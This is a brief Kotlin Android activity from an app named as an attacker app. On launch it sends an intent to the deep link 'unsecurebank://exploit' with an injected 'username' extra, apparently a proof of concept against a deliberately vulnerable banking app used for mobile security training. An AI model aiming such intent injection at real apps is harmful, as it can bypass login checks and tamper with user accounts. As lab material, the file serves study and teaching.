package com.example.attacker

import android.content.Intent
import android.net.Uri
import androidx.appcompat.app.AppCompatActivity
import android.os.Bundle

class MainActivity : AppCompatActivity() {
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)
        val intent = Intent(Intent.ACTION_VIEW)
        intent.data = Uri.parse("unsecurebank://exploit")
        intent.putExtra("username", "123")
        startActivity(intent)
    }
}